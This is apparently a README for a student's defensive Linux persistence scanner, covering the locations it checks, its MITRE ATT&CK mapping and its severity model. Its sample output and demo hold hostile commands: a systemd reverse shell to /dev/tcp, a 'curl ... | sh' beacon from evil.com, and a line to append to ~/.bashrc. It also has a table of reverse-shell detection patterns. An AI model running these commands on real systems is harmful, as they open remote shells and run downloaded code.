# Day 10 — Systemd Persistence Scanner

## What I Built

A Linux persistence hunter that scans the locations attackers use to survive reboots — cron jobs, systemd services, shell init files, SSH keys, and LD_PRELOAD — detects suspicious patterns, classifies findings by severity, maps them to MITRE ATT&CK, and exports SIEM-ready JSON.

---

## How It Works

```
python3 scanner.py         (or sudo python3 scanner.py for root-owned files)
```

Choose:
1. **Scan real system** — checks the actual autorun locations on the machine
2. **Scan a test directory** — safely test detection against mock data

Example output:
```
  [CRITICAL] /etc/systemd/system/evil.service
    Command: ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    Reason:  Reverse shell (/dev/tcp)
    MITRE:   T1543.002 Systemd Service

  [HIGH] /home/user/.bashrc
    Command: curl http://evil.com/beacon.sh | sh
    Reason:  Curl piped to shell (payload download)
    MITRE:   T1546.004 Shell RC

  Total: 9  (CRITICAL: 6, HIGH: 2, MEDIUM: 1)
```

---

## What is Persistence?

After an attacker breaks into a system, they want to **survive reboots and re-establish access** even if kicked out. They plant backdoors in places that auto-run. This is **MITRE ATT&CK Persistence (TA0003)**.

This scanner hunts those locations — the forensic question it answers: *"How is the attacker staying in?"*

---

## Locations Scanned & MITRE Mapping

| Location | Real Paths | MITRE Technique | What hides there |
|----------|-----------|-----------------|------------------|
| **Cron** | `/etc/crontab`, `/etc/cron.*` | T1053.003 | Scheduled backdoor execution |
| **Systemd** | `/etc/systemd/system/`, `/usr/lib/systemd/system/` | T1543.002 | Boot-time backdoors |
| **Shell RC** | `~/.bashrc`, `/etc/profile.d/` | T1546.004 | Login-triggered payloads |
| **SSH Keys** | `~/.ssh/authorized_keys` | T1098.004 | Passwordless backdoor access |
| **LD_PRELOAD** | `/etc/ld.so.preload` | T1574.006 | Library injection into all processes |

---

## Suspicious Patterns Detected

| Pattern | Severity | Why |
|---------|----------|-----|
| `/dev/tcp/` | CRITICAL | Reverse shell |
| `bash -i` | CRITICAL | Interactive reverse shell |
| `nc -e` | CRITICAL | Netcat backdoor |
| `python -c ...socket` | CRITICAL | Python reverse shell |
| `curl \| sh` | HIGH | Downloading and running a payload |
| `wget \| sh` | HIGH | Downloading and running a payload |
| `base64 -d` | MEDIUM | Obfuscated command |
| `eval()` | MEDIUM | Obfuscated execution |
| SSH `command=` | HIGH | Forced-command backdoor key |

---

## Severity Model

Findings are sorted CRITICAL → HIGH → MEDIUM. A reverse shell is CRITICAL (attacker has live access), while base64 obfuscation is MEDIUM (suspicious but needs investigation).

---

## Real-World Use

**Scenario:** Your SSH detector (Day 09) fired a CRITICAL alert — an attacker breached the system. Now you run this scanner to find what they left behind:

1. Run `sudo python3 scanner.py` → option 1 on the compromised host
2. It reads all autorun locations
3. It finds the attacker's cron job / systemd service / injected bashrc line
4. You remove the backdoor and close the entry point

**Proactive hunting:** Run it periodically, compare against a baseline of a known-clean system, and investigate anything new.

---

## Connections to Previous Days

- **Day 08 (CIS Auditor):** Same Linux internals and `subprocess`/file-reading skills
- **Day 09 (SSH Detector):** That detected the breach; this finds what the attacker planted afterward. Both export JSON.

---

## What I Learned

- **Linux persistence mechanisms** — the dozens of autorun locations attackers abuse
- **MITRE ATT&CK Persistence tactic** — T1053, T1543, T1546, T1098, T1574
- **Pattern-based threat hunting** — regex detection of reverse shells, payload downloads, obfuscation
- **Graceful error handling** — skipping root-only files without crashing (`PermissionError`)
- **Privilege matters** — running as user vs root scans different files
- **Safe testing** — using mock fixtures instead of planting real backdoors
- **Severity triage & JSON export** — SOC-grade output

---

## Testing

**Test mode (safe):**
```
python3 scanner.py  →  option 2  →  testdata
```
The `testdata/` folder has fake cron, systemd, and bashrc backdoors.

**Real scan:**
```
sudo python3 scanner.py  →  option 1
```
Scans the live system. On a clean machine, finds nothing (the healthy result). To demo a real catch, plant a test line:
```
echo 'curl http://example.com/x.sh | sh' >> ~/.bashrc
python3 scanner.py   # option 1 catches it
sed -i '/example.com\/x.sh/d' ~/.bashrc   # clean up
```

---

## Frameworks Referenced

| Framework | Relevance |
|-----------|-----------|
| **MITRE ATT&CK** | Persistence tactic (TA0003) and technique IDs |
| **NIST 800-61** | Incident response / post-compromise forensics |

---

## Project Structure

```
persistance-scanner/
├── scanner.py           # The persistence hunter (5 locations)
├── testdata/            # Mock malicious files for safe testing
│   ├── evil_cron
│   ├── evil.service
│   └── evil_bashrc
└── README.md            # This file
```

---

## Requirements

- Linux or WSL
- Python 3
- `sudo` for scanning root-owned files (`/etc/crontab`, root systemd units)

---

**#30DaysOfCyber**
